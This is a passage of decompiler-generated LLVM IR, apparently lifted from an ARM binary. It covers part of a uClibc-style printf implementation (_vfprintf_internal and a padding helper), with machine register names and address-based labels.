  %v1_14834 = and i32 %arg2, 128
  %v2_14834 = icmp eq i32 %v1_14834, 0
  %v0_14838 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14838, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_14834, label %bb, label %dec_label_pc_1484c

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1488c

dec_label_pc_1484c:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14850 = call i32 @strlen(i8* %arg4)
  store i32 %v3_14850, i32* %r0.global-to-local, align 4
  %v1_14854 = load i32, i32* %r4.global-to-local, align 4
  %v2_14854 = sub i32 %v1_14854, %v3_14850
  store i32 %v2_14854, i32* @r4, align 4
  store i32 %v3_14850, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_14854, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_1486c

.thread:                                          ; preds = %dec_label_pc_1484c
  store i32 %v3_14850, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1488c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_1484c
  %v0_1486c = load i32, i32* @r6, align 4
  %v1_1486c = urem i32 %v0_1486c, 128
  %v0_14870 = load i32, i32* @r8, align 4
  store i32 %v0_14870, i32* %r0.global-to-local, align 4
  %v3_14878 = trunc i32 %v1_1486c to i8
  %v4_14878 = call i32 @_charpad(i32 %v0_14870, i8 %v3_14878, i32 %v2_14854)
  store i32 %v4_14878, i32* %r0.global-to-local, align 4
  %v1_1487c = load i32, i32* @r4, align 4
  %v9_1487c = icmp eq i32 %v4_14878, %v1_1487c
  store i32 %v4_14878, i32* %r6.global-to-local, align 4
  br i1 %v9_1487c, label %dec_label_pc_14888, label %dec_label_pc_148a8

dec_label_pc_14888:                               ; preds = %dec_label_pc_1486c
  %v0_14888 = load i32, i32* @r5, align 4
  store i32 %v0_14888, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1488c

dec_label_pc_1488c:                               ; preds = %bb, %.thread, %dec_label_pc_14888
  %v5_14898 = phi i32 [ %v0_14888, %dec_label_pc_14888 ], [ %arg3, %bb ], [ %v3_14850, %.thread ]
  %tmp17 = icmp slt i32 %v5_14898, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_1488c
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_1488c
  %v5_14894 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_14894, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_17e7c.1338 to i32))
  %v0_148a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_148a4 = add i32 %storemerge, %v0_148a4
  store i32 %v2_148a4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_148a8

dec_label_pc_148a8:                               ; preds = %dec_label_pc_1486c, %bb19
  %v0_148a8 = phi i32 [ %v4_14878, %dec_label_pc_1486c ], [ %v2_148a4, %bb19 ]
  store i32 %v0_148a8, i32* %r0.global-to-local, align 4
  %v2_148ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_148ac, i32* %r4.global-to-local, align 4
  store i32 %v9_1482c, i32* %r6.global-to-local, align 4
  ret i32 %v0_148a8

; uselistorder directives
  uselistorder i32 %v0_148a8, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_148a8, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_1488c, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_148b0 = load i32, i32* @r4, align 4
  store i32 %v3_148b0, i32* %stack_var_-36, align 4
  %v6_148b0 = load i32, i32* @r5, align 4
  %v15_148b0 = load i32, i32* @r8, align 4
  %v18_148b0 = load i32, i32* @sb, align 4
  %v21_148b0 = load i32, i32* @sl, align 4
  %v24_148b0 = load i32, i32* @fp, align 4
  %v2_148b8 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_148b8, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_148b8, i32* %r0.global-to-local, align 4
  %v0_148c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_148c4, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_148cc = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_148cc, i32* %r0.global-to-local, align 4
  %v1_148d0 = icmp slt i32 %v2_148cc, 0
  br i1 %v1_148d0, label %dec_label_pc_148d8, label %dec_label_pc_1490c

dec_label_pc_148d8:                               ; preds = %entry
  %v3_148d8 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_148d8, i32* @r4, align 4
  %v1_148dc = inttoptr i32 %v3_148d8 to i8*
  store i32 %v3_148d8, i32* %r0.global-to-local, align 4
  %v3_148e0 = call i32 @strlen(i8* %v1_148dc)
  store i32 %v3_148e0, i32* %r0.global-to-local, align 4
  %v2_148e4 = icmp eq i32 %v3_148e0, 0
  br i1 %v2_148e4, label %bb, label %dec_label_pc_148f4

bb:                                               ; preds = %dec_label_pc_148d8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e84

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148d8
  %v0_148f4 = load i32, i32* @r4, align 4
  store i32 %v0_148f4, i32* %r0.global-to-local, align 4
  %v0_148f8 = load i32, i32* @fp, align 4
  store i32 %v0_148f8, i32* %r2.global-to-local, align 4
  %v3_148fc = call i32 @__stdio_fwrite(i32 %v0_148f4, i32 %v3_148e0, i32 %v0_148f8)
  store i32 %v3_148fc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e84

dec_label_pc_1490c:                               ; preds = %entry
  store i32 %v2_148b8, i32* %r0.global-to-local, align 4
  %v0_14910 = load i32, i32* @r5, align 4
  %v2_14914 = call i32 @_ppfs_prepargs(i32 %v2_148b8, i32 %v0_14910)
  store i32 %v2_14914, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_149b4 = zext i8 %tmp104 to i32
  %v2_149bc = ptrtoint i32* %stack_var_-252 to i32
  %v2_149dc = ptrtoint i32* %stack_var_-36 to i32
  %v2_149f4 = icmp eq i32 %tmp102, 0
  %v1_14a08 = inttoptr i32 %tmp101 to i32*
  %v2_14cf8 = ptrtoint i32* %stack_var_-180 to i32
  %v2_14c14 = ptrtoint i32* %stack_var_-44 to i32
  %v2_14c28 = ptrtoint i32* %stack_var_-52 to i32
  %v3_14bc4 = add i32 %tmp101, 4
  %v4_14bc4 = inttoptr i32 %v3_14bc4 to i32*
  %v2_14bc8 = ptrtoint i32* %stack_var_-328 to i32
  %v7_14a88 = zext i8 %tmp99 to i32
  %v2_14ac4 = ptrtoint i32* %stack_var_-53 to i32
  %v5_14acc = bitcast i32* %stack_var_-53 to i8*
  %v2_14ad4 = icmp ugt i32 %tmp102, 4
  %v7_14ad4 = icmp eq i32 %tmp102, 5
  %v0_14e6c.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_149ec187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_14be8 = icmp ugt i32 %tmp102, 16
  %v7_14be8 = icmp eq i32 %tmp102, 17
  %v2_14bec = xor i1 %v7_14be8, true
  %v3_14bec = and i1 %v2_14be8, %v2_14bec
  %v2_14c88 = icmp ugt i32 %tmp102, 18
  %v7_14c88 = icmp eq i32 %tmp102, 19
  %v2_14c8c = xor i1 %v7_14c88, true
  %v3_14c8c = and i1 %v2_14c88, %v2_14c8c
  %v7_14cec = icmp eq i32 %tmp102, 20
  %v2_14a2c = add i32 %tmp102, ptrtoint (i32* @global_var_21fa0.1340 to i32)
  %v1_14a30 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_21fa0.1340 to i32), i32 -1)
  %v2_14a30 = inttoptr i32 %v1_14a30 to i8*
  %v2_14a5c = xor i1 %v7_14ad4, true
  %v3_14a5c = and i1 %v2_14ad4, %v2_14a5c
  %v7_14a90 = icmp eq i32 %tmp102, 1
  %v2_14adc = xor i1 %v2_14ad4, true
  %v3_14adc = or i1 %v7_14ad4, %v2_14adc
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_14b44 = icmp eq i32 %tmp102, 3
  %v11_14b50 = icmp eq i32 %tmp102, 4
  %v9_149c0 = mul nuw nsw i32 %v4_149b4, 8
  %v10_149c0 = add nsw i32 %v9_149c0, -8
  %v6_149c8 = add i32 %v10_149c0, %v2_149bc
  br label %dec_label_pc_14e6c

bb126:                                            ; preds = %dec_label_pc_14924.outer, %.thread7
  %v2_14924185 = phi i8 [ %v2_14924, %.thread7 ], [ %v2_14924181, %dec_label_pc_14924.outer ]
  %v1_14938184 = phi i32 [ %v2_14938, %.thread7 ], [ %v0_1492449, %dec_label_pc_14924.outer ]
  %v8_1492c = icmp eq i8 %v2_14924185, 37
  br i1 %v8_1492c, label %dec_label_pc_14940, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14938 = add i32 %v1_14938184, 1
  store i32 %v2_14938, i32* @r4, align 4
  %v1_14924 = inttoptr i32 %v2_14938 to i8*
  %v2_14924 = load i8, i8* %v1_14924, align 1
  %v3_14924 = zext i8 %v2_14924 to i32
  store i32 %v3_14924, i32* %r3.global-to-local, align 4
  %v2_14928 = icmp eq i8 %v2_14924, 0
  br i1 %v2_14928, label %dec_label_pc_14940, label %bb126

dec_label_pc_14940:                               ; preds = %bb126, %.thread7, %dec_label_pc_14924.outer
  %v1_14938.lcssa = phi i32 [ %v0_1492449, %dec_label_pc_14924.outer ], [ %v2_14938, %.thread7 ], [ %v1_14938184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14940 = sub i32 %v1_14938.lcssa, %v5_14950
  %v9_14940 = icmp eq i32 %v1_14938.lcssa, %v5_14950
  br i1 %v9_14940, label %dec_label_pc_14974, label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %dec_label_pc_14940
  store i32 %v2_14940, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_14940, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_14948
  store i32 %v5_14950, i32* %r0.global-to-local, align 4
  %v5_14958 = load i32, i32* @fp, align 4
  store i32 %v5_14958, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_14948, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_14948 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_17e7c.1338 to i32))
  %v0_14960 = load i32, i32* %r0.global-to-local, align 4
  %v1_14960 = load i32, i32* @r5, align 4
  %v9_14960 = icmp eq i32 %v0_14960, %v1_14960
  br i1 %v9_14960, label %dec_label_pc_14968, label %dec_label_pc_14e7c

dec_label_pc_14968:                               ; preds = %bb130
  %v2_1496c = add i32 %v0_14960, %stack_var_-336.1.ph
  %v0_14974.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %dec_label_pc_14940, %dec_label_pc_14968
  %v0_14988 = phi i32 [ %v5_14950, %dec_label_pc_14940 ], [ %v0_14974.pre, %dec_label_pc_14968 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_14940 ], [ %v2_1496c, %dec_label_pc_14968 ]
  %v1_14974 = inttoptr i32 %v0_14988 to i8*
  %v2_14974 = load i8, i8* %v1_14974, align 1
  %v3_14974 = zext i8 %v2_14974 to i32
  store i32 %v3_14974, i32* %r3.global-to-local, align 4
  %v2_14978 = icmp eq i8 %v2_14974, 0
  br i1 %v2_14978, label %dec_label_pc_14e84, label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_14974
  %v1_14980 = add i32 %v0_14988, 1
  %v2_14980 = inttoptr i32 %v1_14980 to i8*
  %v3_14980 = load i8, i8* %v2_14980, align 1
  %v4_14980 = zext i8 %v3_14980 to i32
  store i32 %v4_14980, i32* %r3.global-to-local, align 4
  %v7_14984 = icmp eq i8 %v3_14980, 37
  store i32 %v1_14980, i32* %r2.global-to-local, align 4
  br i1 %v7_14984, label %dec_label_pc_14e74, label %dec_label_pc_14990

dec_label_pc_14990:                               ; preds = %dec_label_pc_14980
  store i32 %v2_148b8, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_148b8, i32* %r0.global-to-local, align 4
  store i32 %v1_14980, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_149a4 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_148b8, i32* @r0, align 4
  %v0_149ac = call i32 @_ppfs_setargs()
  store i32 %v0_149ac, i32* %r0.global-to-local, align 4
  store i32 %v4_149b4, i32* %ip.global-to-local, align 4
  store i32 %v2_149bc, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_14990
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_14990
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_149c8, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_149d478 = phi i32 [ %v6_149c8, %bb133 ], [ %v2_149bc, %.thread ]
  store i32 %v2_149dc, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_149ec187, label %dec_label_pc_149d4, label %dec_label_pc_149f0

dec_label_pc_149d4:                               ; preds = %bb134, %dec_label_pc_149d4
  %v5_149e4189 = phi i32 [ %v5_149e4, %dec_label_pc_149d4 ], [ %v2_149dc, %bb134 ]
  %v0_149d4188 = phi i32 [ %v1_149d8, %dec_label_pc_149d4 ], [ %v0_149d478, %bb134 ]
  %v2_149d4 = add i32 %v5_149e4189, -4
  %v3_149d4 = inttoptr i32 %v2_149d4 to i32*
  store i32 %v0_149d4188, i32* %v3_149d4, align 4
  %v0_149d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_149d8 = add i32 %v0_149d8, 8
  store i32 %v1_149d8, i32* %r3.global-to-local, align 4
  %v0_149e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149e0.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_149dc, i32* @lr, align 4
  %v4_149e4 = mul i32 %v0_149e0.pre, 4
  %v5_149e4 = add i32 %v4_149e4, %v2_149dc
  %v1_149e8 = add i32 %v0_149e0.pre, 1
  store i32 %v1_149e8, i32* %r2.global-to-local, align 4
  %v5_149ec = icmp slt i32 %v0_149e0.pre, %v1_149e0.pre
  br i1 %v5_149ec, label %dec_label_pc_149d4, label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149d4, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_149f4, label %dec_label_pc_149fc, label %dec_label_pc_14a20

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149f0
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_14a08 = load i32, i32* %v1_14a08, align 4
  store i32 %v2_14a08, i32* %r0.global-to-local, align 4
  %v1_14a0c = and i32 %v0_14a50, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_14a14 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_14a14, i32* %r3.global-to-local, align 4
  %v4_14a18 = inttoptr i32 %v2_14a08 to i8*
  %v5_14a18 = call i32 @_store_inttype(i8* %v4_14a18, i32 %v1_14a0c, i32 %stack_var_-336.2, i32 %v3_14a14)
  store i32 %v5_14a18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e68

dec_label_pc_14a20:                               ; preds = %dec_label_pc_149f0
  br i1 %tmp195, label %dec_label_pc_14bac, label %dec_label_pc_14a28

dec_label_pc_14a28:                               ; preds = %dec_label_pc_14a20
  store i32 %v2_14a2c, i32* %r3.global-to-local, align 4
  %v3_14a30 = load i8, i8* %v2_14a30, align 1
  %v4_14a30 = zext i8 %v3_14a30 to i32
  store i32 %v4_14a30, i32* @r4, align 4
  %v7_14a34 = icmp eq i8 %v3_14a30, 10
  br i1 %v7_14a34, label %dec_label_pc_14a40, label %bb135

bb135:                                            ; preds = %dec_label_pc_14a28
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_14a40:                               ; preds = %dec_label_pc_14a28
  store i32 %v0_14a50, i32* %r3.global-to-local, align 4
  %v1_14a44 = and i32 %v0_14a50, 32
  %v2_14a44 = icmp eq i32 %v1_14a44, 0
  %.175 = select i1 %v2_14a44, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_14a50 = and i32 %v0_14a50, 64
  %v2_14a50 = icmp eq i32 %v1_14a50, 0
  br i1 %v2_14a50, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_14a40
  %.176 = select i1 %v2_14a44, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_14a40, %bb138
  br i1 %v3_14a5c, label %.thread84, label %dec_label_pc_14a64

.thread84:                                        ; preds = %bb139
  %v5_14a5c = sub nsw i32 0, %v4_14a30
  store i32 %v5_14a5c, i32* @r4, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a64:                               ; preds = %bb139
  br i1 %v7_14b44, label %bb140, label %dec_label_pc_14a70

bb140:                                            ; preds = %dec_label_pc_14a64
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a70:                               ; preds = %dec_label_pc_14a64
  br i1 %v7_14a90, label %dec_label_pc_14a80, label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %.thread84, %bb140, %dec_label_pc_14a70
  %v0_14aa886 = phi i32 [ %v5_14a5c, %.thread84 ], [ %v4_14a30, %bb140 ], [ %v4_14a30, %dec_label_pc_14a70 ]
  br label %dec_label_pc_14a80

dec_label_pc_14a80:                               ; preds = %dec_label_pc_14a70, %dec_label_pc_14a7c
  %v0_14aa885 = phi i32 [ %v0_14aa886, %dec_label_pc_14a7c ], [ %v4_14a30, %dec_label_pc_14a70 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_14a7c ], [ 6, %dec_label_pc_14a70 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_14a80 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14a80, i32* %r3.global-to-local, align 4
  %v1_14a84 = icmp slt i32 %v3_14a80, 0
  %v7_14a88. = select i1 %v1_14a84, i32 %v7_14a88, i32 32
  store i32 %v7_14a88., i32* @sb, align 4
  br i1 %v7_14a90, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_14a80
  store i32 %v2_149dc, i32* @lr, align 4
  %v2_14a98 = load i32, i32* %ip.global-to-local, align 4
  %v5_14a98 = mul i32 %v2_14a98, 4
  %v6_14a98 = add i32 %v5_14a98, %v2_149dc
  store i32 %v6_14a98, i32* %r3.global-to-local, align 4
  %v2_14a9c = add i32 %v6_14a98, -260
  %v3_14a9c = inttoptr i32 %v2_14a9c to i32*
  %v4_14a9c = load i32, i32* %v3_14a9c, align 4
  store i32 %v4_14a9c, i32* %r3.global-to-local, align 4
  %v2_14aa4 = and i32 %v4_14a9c, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_14a80, %.thread16
  %storemerge94 = phi i32 [ %v2_14aa4, %.thread16 ], [ 1024, %dec_label_pc_14a80 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_14aa885, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_14ab0 = call i32 @_load_inttype()
  %v0_14ab4 = load i32, i32* @r1, align 4
  store i32 %v0_14ab4, i32* %r2.global-to-local, align 4
  %v0_14ac0 = load i32, i32* @r4, align 4
  store i32 %v0_14ac0, i32* %r3.global-to-local, align 4
  store i32 %v2_14ac4, i32* %r0.global-to-local, align 4
  %v0_14ac8 = load i32, i32* @r5, align 4
  %v6_14acc = call i32 @_uintmaxtostr(i8* %v5_14acc, i32 %v0_14ab0, i32 %v0_14ab4, i32 %v0_14ac0, i32 %v0_14ac8)
  store i32 %v6_14acc, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_14acc, i32* @r6, align 4
  br i1 %v3_14adc, label %bb148, label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %bb145
  %v7_14acc = inttoptr i32 %v6_14acc to i8*
  %v3_14ae0 = load i8, i8* %v7_14acc, align 1
  %v7_14ae4 = icmp eq i8 %v3_14ae0, 45
  %v2_14aec = or i32 %v0_14a50, 2
  %v2_14aec.stack_var_-316.4 = select i1 %v7_14ae4, i32 %v2_14aec, i32 %v0_14a50
  store i32 %v2_14aec.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_14ae4, label %.thread18, label %dec_label_pc_14b00

.thread18:                                        ; preds = %dec_label_pc_14ae0
  %v3_14af0 = add i32 %v6_14acc, 1
  store i32 %v3_14af0, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14ae0
  %v1_14b00 = and i32 %v2_14aec.stack_var_-316.4, 2
  %v2_14b00 = icmp eq i32 %v1_14b00, 0
  br i1 %v2_14b00, label %dec_label_pc_14b0c, label %bb146

bb146:                                            ; preds = %dec_label_pc_14b00
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_14b0c:                               ; preds = %dec_label_pc_14b00
  %v1_14b0c = urem i32 %v2_14aec.stack_var_-316.4, 2
  %v2_14b0c = icmp eq i32 %v1_14b0c, 0
  br i1 %v2_14b0c, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_14b0c
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_14b0c, %bb147
  %v0_14b68 = phi i32 [ %v6_14acc, %bb145 ], [ %v3_14af0, %.thread18 ], [ %v6_14acc, %dec_label_pc_14b0c ], [ %v6_14acc, %bb147 ], [ %v6_14acc, %bb146 ]
  %v0_14b24 = phi i32 [ %v0_14a50, %bb145 ], [ %v2_14aec, %.thread18 ], [ %v0_14a50, %dec_label_pc_14b0c ], [ %v0_14a50, %bb147 ], [ %v0_14a50, %bb146 ]
  %v3_14b14 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14b14, i32* %r2.global-to-local, align 4
  store i32 %v0_14b24, i32* %r3.global-to-local, align 4
  %v1_14b1c = icmp slt i32 %v3_14b14, 0
  br i1 %v1_14b1c, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_14b4c = phi i32 [ %v3_14b14, %bb148 ], [ 1, %bb149 ]
  %v1_14b24 = and i32 %v0_14b24, 16
  %v2_14b24 = icmp eq i32 %v1_14b24, 0
  store i32 %v2_14cf8, i32* %r3.global-to-local, align 4
  %v2_14b2c = sub i32 %v2_14cf8, %v0_14b68
  %v1_14b30 = add i32 %v2_14b2c, 127
  store i32 %v1_14b30, i32* @r5, align 4
  br i1 %v2_14b24, label %bb157, label %dec_label_pc_14b38

dec_label_pc_14b38:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_14b38
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_14b38, %bb151
  br i1 %v7_14b44, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_14b4c, %v1_14b30
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_14b50, label %dec_label_pc_14b58, label %bb157

dec_label_pc_14b58:                               ; preds = %bb155
  %v1_14b58 = inttoptr i32 %v0_14b68 to i8*
  %v2_14b58 = load i8, i8* %v1_14b58, align 1
  %v3_14b58 = zext i8 %v2_14b58 to i32
  store i32 %v3_14b58, i32* %r3.global-to-local, align 4
  %v7_14b5c = icmp eq i8 %v2_14b58, 48
  br i1 %v7_14b5c, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_14b58
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_14b58
  %v2_14b64 = add i32 %v2_14b2c, 128
  store i32 %v2_14b64, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_14ba0 = phi i32 [ %v0_14b4c, %bb155 ], [ %v0_14b4c, %bb150 ], [ 1, %bb156 ], [ %v2_14b64, %.thread25 ], [ %v0_14b4c, %bb154 ]
  %v1_14b68 = inttoptr i32 %v0_14b68 to i8*
  %v2_14b68 = load i8, i8* %v1_14b68, align 1
  %v3_14b68 = zext i8 %v2_14b68 to i32
  store i32 %v3_14b68, i32* %r3.global-to-local, align 4
  %v7_14b6c = icmp eq i8 %v2_14b68, 48
  br i1 %v7_14b6c, label %dec_label_pc_14b74, label %dec_label_pc_14b9c

dec_label_pc_14b74:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_14b78 = load i32, i32* @r7, align 4
  %v7_14b7c = icmp slt i32 %v0_14b78, 6
  br i1 %v7_14b7c, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_14b74
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_14b74, %bb158
  br i1 %v7_14a90, label %.thread26, label %dec_label_pc_14b90

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_21f84.1342 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_14d10

dec_label_pc_14b90:                               ; preds = %bb159
  %v2_14b90 = icmp eq i32 %v5_14ba0, 0
  br i1 %v2_14b90, label %bb160, label %dec_label_pc_14b9c

bb160:                                            ; preds = %dec_label_pc_14b90
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14d10

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14b90, %bb157
  %v2_14b9c = sub i32 %v5_14ba0, %v1_14b30
  %tmp199 = icmp ugt i32 %v5_14ba0, %v1_14b30
  br i1 %tmp199, label %.thread90, label %dec_label_pc_14d10

.thread90:                                        ; preds = %dec_label_pc_14b9c
  store i32 %v2_14b9c, i32* @r4, align 4
  br label %dec_label_pc_14d2cthread-pre-split

dec_label_pc_14bac:                               ; preds = %dec_label_pc_14a20
  br i1 %tmp196, label %dec_label_pc_14be8, label %dec_label_pc_14bb4

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14bac
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_14bc0 = load i32, i32* @fp, align 4
  store i32 %v0_14bc0, i32* %r0.global-to-local, align 4
  %v2_14bc4 = load i32, i32* %v1_14a08, align 4
  %v5_14bc4 = load i32, i32* %v4_14bc4, align 4
  store i32 %v5_14bc4, i32* %r2.global-to-local, align 4
  store i32 %v2_14bc8, i32* %r3.global-to-local, align 4
  %v5_14bcc = sext i32 %v2_14bc4 to i64
  %v6_14bcc = bitcast i64 %v5_14bcc to double
